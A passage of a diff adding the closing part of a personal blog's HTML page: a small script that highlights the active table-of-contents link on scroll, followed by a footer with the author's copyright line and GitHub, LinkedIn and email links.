+        links.forEach(function(l) { l.classList.remove('toc-link--active'); });
+        var active = nav.querySelector('a[href="#' + entry.target.id + '"]');
+        if (active) active.classList.add('toc-link--active');
+      }
+    });
+  }, { rootMargin: '0px 0px -70% 0px', threshold: 0 });
+
+  headings.forEach(function(h) { observer.observe(h); });
+})();
+</script>
+</main>
+
+<footer class="footer">
+  <div class="footer__inner">
+    <div>
+      <div class="footer__brand">
+        <span class="footer__brand-dot"></span>
+        Zereza's Blog
+      </div>
+      <div class="footer__copy">© 2026 Miguel Peñaranda</div>
+    </div>
+    <div class="footer__links">
+      <a href="https://github.com/mzereza" target="_blank" rel="noopener">github</a>
+      <a href="https://linkedin.com/in/miguel-t-pe%C3%B1aranda-padilla-227076372" target="_blank" rel="noopener">linkedin</a>
+      <a href="mailto:mig.penaranda07@gmail.com">email</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
